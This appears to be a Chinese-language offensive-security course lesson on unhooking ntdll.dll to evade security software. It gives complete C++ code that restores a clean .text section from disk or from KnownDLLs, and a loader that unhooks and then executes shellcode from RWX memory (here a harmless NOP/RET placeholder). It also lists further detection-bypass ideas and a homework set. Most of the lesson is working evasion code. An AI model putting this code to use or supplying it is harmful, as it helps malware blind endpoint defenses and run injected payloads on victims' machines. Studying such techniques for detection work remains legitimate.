# 课时06：重载NTDLL

## 1. 课程概述

### 1.1 学习目标

- 理解安全软件Hook ntdll的方式
- 掌握从磁盘重新加载ntdll的技术
- 学会使用干净ntdll副本绕过Hook
- 理解内存映射与PE加载机制

### 1.2 前置知识

- PE文件结构
- 内存映射基础
- API Hook原理

---

## 2. 名词解释

### 2.1 核心术语

| 术语 | 说明 |
|------|------|
| **ntdll.dll** | Windows最底层的用户态DLL |
| **Hook** | 拦截函数调用的技术 |
| **PE映射** | 将PE文件加载到内存 |
| **.text段** | PE文件中的代码段 |
| **重载/Unhook** | 恢复被Hook的函数 |

### 2.2 为什么需要重载NTDLL

```
进程启动时:
1. Windows加载ntdll.dll
2. 安全软件注入并Hook ntdll
3. 我们调用Nt函数被拦截

重载后:
1. 从磁盘读取原始ntdll.dll
2. 覆盖被Hook的.text段
3. 函数恢复正常
```

---

## 3. 实现方案

### 3.1 方案比较

| 方案 | 优点 | 缺点 |
|------|------|------|
| 从磁盘读取 | 简单直接 | 需要文件访问 |
| 从KnownDLLs读取 | 更干净 | 需要特殊权限 |
| 从挂起进程读取 | 绕过检测 | 实现复杂 |

---

## 4. 实现代码

### 4.1 从磁盘读取并重载

```cpp
#include <windows.h>
#include <stdio.h>

BOOL UnhookNtdll() {
    printf("[*] Starting ntdll unhooking...\n");
    
    // 1. 获取当前加载的ntdll基址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }
    printf("[+] Current ntdll at: 0x%p\n", hNtdll);
    
    // 2. 从磁盘读取原始ntdll
    HANDLE hFile = CreateFileW(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open ntdll.dll\n");
        return FALSE;
    }
    
    // 获取文件大小
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    printf("[+] File size: %lu bytes\n", dwFileSize);
    
    // 分配内存读取文件
    LPVOID pNtdllBuffer = VirtualAlloc(NULL, dwFileSize, 
                                        MEM_COMMIT | MEM_RESERVE, 
                                        PAGE_READWRITE);
    if (!pNtdllBuffer) {
        CloseHandle(hFile);
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }
    
    // 读取文件
    DWORD dwBytesRead;
    if (!ReadFile(hFile, pNtdllBuffer, dwFileSize, &dwBytesRead, NULL)) {
        VirtualFree(pNtdllBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        printf("[-] Failed to read file\n");
        return FALSE;
    }
    CloseHandle(hFile);
    
    printf("[+] Read %lu bytes from disk\n", dwBytesRead);
    
    // 3. 解析PE结构
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdllBuffer;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBuffer + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    // 4. 找到.text段
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            printf("[+] Found .text section\n");
            printf("    Virtual Address: 0x%X\n", pSection[i].VirtualAddress);
            printf("    Size: 0x%X\n", pSection[i].Misc.VirtualSize);
            
            // 5. 计算地址
            LPVOID pDst = (PBYTE)hNtdll + pSection[i].VirtualAddress;
            LPVOID pSrc = (PBYTE)pNtdllBuffer + pSection[i].PointerToRawData;
            SIZE_T size = pSection[i].Misc.VirtualSize;
            
            // 6. 修改内存保护
            DWORD oldProtect;
            if (!VirtualProtect(pDst, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[-] VirtualProtect failed\n");
                VirtualFree(pNtdllBuffer, 0, MEM_RELEASE);
                return FALSE;
            }
            
            // 7. 复制干净的.text段
            memcpy(pDst, pSrc, size);
            printf("[+] Copied %zu bytes to .text section\n", size);
            
            // 8. 恢复内存保护
            VirtualProtect(pDst, size, oldProtect, &oldProtect);
            
            printf("[+] ntdll unhook completed!\n");
            break;
        }
    }
    
    VirtualFree(pNtdllBuffer, 0, MEM_RELEASE);
    return TRUE;
}

int main() {
    printf("========== NTDLL Unhooking ==========\n");
    
    if (UnhookNtdll()) {
        printf("[+] Success!\n");
    } else {
        printf("[-] Failed!\n");
    }
    
    return 0;
}
```

### 4.2 从KnownDLLs读取

```cpp
#include <windows.h>
#include <stdio.h>

BOOL UnhookFromKnownDlls() {
    // 打开KnownDLLs中的ntdll
    HANDLE hSection = NULL;
    UNICODE_STRING usSectionName;
    OBJECT_ATTRIBUTES objAttr;
    
    // 需要使用未导出API
    typedef NTSTATUS(NTAPI* pNtOpenSection)(
        PHANDLE SectionHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes
    );
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtOpenSection NtOpenSection = (pNtOpenSection)GetProcAddress(hNtdll, "NtOpenSection");
    
    if (!NtOpenSection) {
        printf("[-] NtOpenSection not found\n");
        return FALSE;
    }
    
    // \KnownDlls\ntdll.dll
    WCHAR szSectionName[] = L"\\KnownDlls\\ntdll.dll";
    
    // 初始化UNICODE_STRING
    usSectionName.Buffer = szSectionName;
    usSectionName.Length = wcslen(szSectionName) * sizeof(WCHAR);
    usSectionName.MaximumLength = usSectionName.Length + sizeof(WCHAR);
    
    // 初始化OBJECT_ATTRIBUTES
    memset(&objAttr, 0, sizeof(objAttr));
    objAttr.Length = sizeof(objAttr);
    objAttr.ObjectName = &usSectionName;
    
    // 打开section
    NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != 0) {
        printf("[-] NtOpenSection failed: 0x%X\n", status);
        return FALSE;
    }
    
    printf("[+] Opened KnownDlls section\n");
    
    // 映射到内存
    PVOID pMapped = NULL;
    SIZE_T viewSize = 0;
    
    typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
        HANDLE SectionHandle,
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        SIZE_T CommitSize,
        PLARGE_INTEGER SectionOffset,
        PSIZE_T ViewSize,
        DWORD InheritDisposition,
        ULONG AllocationType,
        ULONG Win32Protect
    );
    
    pNtMapViewOfSection NtMapViewOfSection = 
        (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pMapped,
        0,
        0,
        NULL,
        &viewSize,
        1,  // ViewShare
        0,
        PAGE_READONLY
    );
    
    if (status != 0) {
        CloseHandle(hSection);
        printf("[-] NtMapViewOfSection failed: 0x%X\n", status);
        return FALSE;
    }
    
    printf("[+] Mapped at: 0x%p (Size: 0x%zX)\n", pMapped, viewSize);
    
    // 现在可以使用pMapped作为干净的ntdll副本
    // ... 复制.text段的代码与之前类似 ...
    
    CloseHandle(hSection);
    return TRUE;
}
```

### 4.3 完整加载器示例

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,  // nop
    0xC3                     // ret
};

int main() {
    printf("========== NTDLL Unhook + ShellCode Execution ==========\n");
    
    // 1. 先unhook ntdll
    if (!UnhookNtdll()) {
        printf("[-] Unhook failed, continuing anyway...\n");
    }
    
    // 2. 现在Nt函数不会被安全软件拦截
    typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
    );
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = 
        (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    PVOID pMemory = NULL;
    SIZE_T size = sizeof(shellcode);
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (status != 0) {
        printf("[-] Allocation failed\n");
        return 1;
    }
    
    printf("[+] Memory at: 0x%p\n", pMemory);
    
    memcpy(pMemory, shellcode, sizeof(shellcode));
    ((void(*)())pMemory)();
    
    printf("[+] Done!\n");
    return 0;
}
```

---

## 5. 检测与对抗

### 5.1 安全软件可能的检测方式

- 监控对ntdll.dll文件的访问
- 检测.text段的修改
- 重新Hook

### 5.2 绕过思路

- 从其他位置获取ntdll（如WoW64）
- 使用挂起进程技术
- 结合直接syscall

---

## 6. 课后作业

### 6.1 基础练习

1. 实现从磁盘读取并重载ntdll
2. 对比重载前后的Nt函数字节

### 6.2 进阶练习

1. 实现从KnownDLLs重载
2. 检测ntdll是否被Hook的工具

---

## 7. 下一课预告

下一课我们将学习**“映射注入执行ShellCode”**。
